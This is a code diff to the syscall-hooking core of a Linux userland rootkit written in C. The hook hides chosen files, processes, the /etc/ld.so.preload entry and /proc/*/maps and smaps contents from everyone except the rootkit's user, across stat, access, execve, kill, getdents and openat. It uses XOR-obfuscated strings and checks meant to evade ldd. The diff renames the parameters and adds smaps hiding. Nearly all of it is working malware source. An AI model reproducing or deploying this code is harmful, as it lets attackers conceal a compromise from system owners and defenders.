@@ -18,7 +18,7 @@
 #include <sys/syscall.h>
 #include <sys/mman.h>
 
-#define DEBUG
+
 #define BUF_SIZE 8192
 #include "utils/clean.c"
 #include "utils/xor.c"
@@ -52,68 +52,18 @@ struct linux_dirent {
     char           d_name[];
 };
 
-static long rk_hook(long a1, long a2, long a3,
-			  long a4, long a5, long a6,
-			  long a7)
+static long rk_hook(
+    long rax_stack, long rdi, long rsi,
+	long rdx, long r10_stack, long r8,
+	long r9)
 {
-    // DEBUG_MSG("rax_stack=%ld rdi=%ld rsi=%ld rdx=%ld r10_stack=%ld r8=%ld r9=%ld\n", a1, a2, a3, a4, a5, a6, a7);
-    switch(a1) {
-        // case 0: {
-        //     // ssize_t read(int fd, void *buf, size_t count);
-        //     if (is_rk_user()) break;
-        //     DEBUG_MSG("[-] read hooked!\n")
-        //     char path[256];
-        //     int fd = (int)a2;
-        //     fd_to_fname(fd, path, sizeof(path));
-        //     if (check_if_hidden_path(path)) {
-        //         DEBUG_MSG("[!] Hiding file %s from read\n", path);
-        //         return -1;
-        //     }
-        //     break;
-        // }
-        // case 1: {
-        //     // ssize_t write(int fd, const void *buf, size_
-        //     if (is_rk_user()) break;
-        //     DEBUG_MSG("[-] write hooked!\n");
-        //     char path[256];
-        //     int fd = (int)a2;
-        //     fd_to_fname(fd, path, sizeof(path));
-        //     if (check_if_hidden_path(path)) {
-        //         DEBUG_MSG("[!] Hiding file %s from wrute\n", path);
-        //         return -1;
-        //     }
-        //     break;
-        // }
-        // case SYS_OPEN: {
-        //     // int open(const char *pathname, int flags);
-        //     if (is_rk_user()) break;
-        //     DEBUG_MSG("[-] open hooked!\n");
-        //     const char *path = (const char *)a2;
-        //     if (check_if_hidden_path(path)) {
-        //         DEBUG_MSG("[!] Hiding file %s from open\n", path);
-        //         return -ENOENT;
-        //     }
-        //     break;
-        // }
-        // case SYS_CLOSE: {
-        //     // int close(int fd);
-        //     if (is_rk_user()) break;
-        //     DEBUG_MSG("[-] close hooked!\n");
-        //     int fd;
-        //     char path[256];
-        //     fd = (int)a2;
-        //     fd_to_fname(fd, path, sizeof(path));
-        //     if (check_if_hidden_path(path)) {
-        //         DEBUG_MSG("[!] Hiding file %s from close\n", path);
-        //         return -1;
-        //     }
-        //     break;
-        // }
+    // DEBUG_MSG("rax_stack=%ld rdi=%ld rsi=%ld rdx=%ld r10_stack=%ld r8=%ld r9=%ld\n", a1, rdi, rsi, rdx, r10_stack, r8, r9);
+    switch(rax_stack) {
         case SYS_STAT: {
             // int stat(const char *path, struct stat *buf);
             if (is_rk_user()) break;
             DEBUG_MSG("[-] stat hooked!\n");
-            const char *path = (const char *)a2;
+            const char *path = (const char *)rdi;
             if (check_if_hidden_str(path)) {
                 DEBUG_MSG("[!] Hiding file %s from stat\n", path);
                 return -ENOENT;
@@ -126,7 +76,7 @@ static long rk_hook(long a1, long a2, long a3,
             DEBUG_MSG("[-] fstat hooked!\n");
             int fd;
             char path[256];
-            fd = (int)a2;
+            fd = (int)rdi;
             fd_to_fname(fd, path, sizeof(path));             
             if (check_if_hidden_str(path)) {
                 DEBUG_MSG("[!] Hiding file %s from fstat\n", path);
@@ -138,7 +88,7 @@ static long rk_hook(long a1, long a2, long a3,
             // int lstat(const char *path, struct stat *buf); 
             if (is_rk_user()) break;
             DEBUG_MSG("[-] lstat hooked!\n");
-            char *path = (char *)a2;
+            char *path = (char *)rdi;
             if (check_if_hidden_str(path)) {
                 DEBUG_MSG("[!] Hiding file %s from lstat\n", path);
                 return -ENOENT;
@@ -149,7 +99,7 @@ static long rk_hook(long a1, long a2, long a3,
             // int access(const char *pathname, int mode);
             if (is_rk_user()) break;
             DEBUG_MSG("[-] access hooked!\n");
-            char *path = (char *)a2;
+            char *path = (char *)rdi;
             if (check_if_hidden_str(path)) {
                 DEBUG_MSG("[!] Hiding file %s from access\n", path);
                 return -ENOENT;
@@ -160,9 +110,9 @@ static long rk_hook(long a1, long a2, long a3,
             // int execve(const char *filename, char *const argv[], char *const envp[]);
             if (is_rk_user()) break;
             DEBUG_MSG("[-] execve hooked!\n");
-            char *filename = (char *)a2;
-            char **argv = (char **)a3;
-            char **envp = (char **)a4;
+            char *filename = (char *)rdi;
+            char **argv = (char **)rsi;
+            char **envp = (char **)rdx;
             char *ld_linux_so = strdup(LD_LINUX_SO_PATH); xor(ld_linux_so);
             char *env = strdup(ENV_PATH); xor(env);
             DEBUG_MSG("[-] Executing %s\n", filename);
@@ -181,6 +131,8 @@ static long rk_hook(long a1, long a2, long a3,
             // i = 0;
             
             /* BAD CODE, REVAMP LATER */
+            // check if we are calling strace 
+
             // check if we are calling ldd
             if (!strcmp(ld_linux_so, filename)) {
                 CLEAN(ld_linux_so);
@@ -215,7 +167,7 @@ static long rk_hook(long a1, long a2, long a3,
             DEBUG_MSG("[-] kill hooked!\n");
             
             // convert pid to string
-            pid_t pid = (pid_t)a2;
+            pid_t pid = (pid_t)rdi;
             char pid_str[20];
             char proc_name[4096];
             sprintf(pid_str, "%d", pid);
@@ -234,8 +186,8 @@ static long rk_hook(long a1, long a2, long a3,
             DEBUG_MSG("[-] getdents hooked!\n");
             char tmpbuf[BUF_SIZE];
             int nread;
-            int fd = (int)a2;
-            struct linux_dirent *dirp = (struct linux_dirent *)a3;
+            int fd = (int)rdi;
+            struct linux_dirent *dirp = (struct linux_dirent *)rsi;
             int valid_len = 0;
 
             // Check if we are in /proc or not
@@ -297,8 +249,8 @@ static long rk_hook(long a1, long a2, long a3,
             DEBUG_MSG("[-] getdents64 hooked!\n");
             char tmpbuf[BUF_SIZE];
             int nread;
-            int fd = (int)a2;
-            struct linux_dirent64 *dirp = (struct linux_dirent64 *)a3;
+            int fd = (int)rdi;
+            struct linux_dirent64 *dirp = (struct linux_dirent64 *)rsi;
             int valid_len = 0;
 
             // Check if we are in /proc or not
@@ -382,7 +334,7 @@ static long rk_hook(long a1, long a2, long a3,
             //  int openat(int fd, const char *path, int oflag, ...);
             if (is_rk_user()) break;
             DEBUG_MSG("[-] openat hooked!\n");
-            char *path = (char *)a3;
+            char *path = (char *)rsi;
             DEBUG_MSG("[-] Attempting to open %s\n", path);
             if (check_if_hidden_str(path)) {
                 DEBUG_MSG("[!] Hiding file %s\n", path);
@@ -393,6 +345,11 @@ static long rk_hook(long a1, long a2, long a3,
                 DEBUG_MSG("[!] Hiding from /proc/*/maps\n");
                 return hide_maps(path);
             }
+            if (!fnmatch("/proc/*/smaps", path, FNM_PATHNAME)) {
+                DEBUG_MSG("[!] Hiding from /proc/*/smaps\n");
+                return hide_smaps(path);
+            }
+            
             char *ld = strdup(LD_SO_PRELOAD_PATH); xor(ld);
             if (!strcmp(path, ld)) {
                // TODO: Return backup if /etc/ld.so.preload already existed 
@@ -408,7 +365,7 @@ static long rk_hook(long a1, long a2, long a3,
             ;
     }
     // DEBUG_MSG("Returning next_sys_call %d\n", a1);    
-	return next_sys_call(a1, a2, a3, a4, a5, a6, a7);
+	return next_sys_call(rax_stack, rdi, rsi, rdx, r10_stack, r8, r9);
 }
 
 
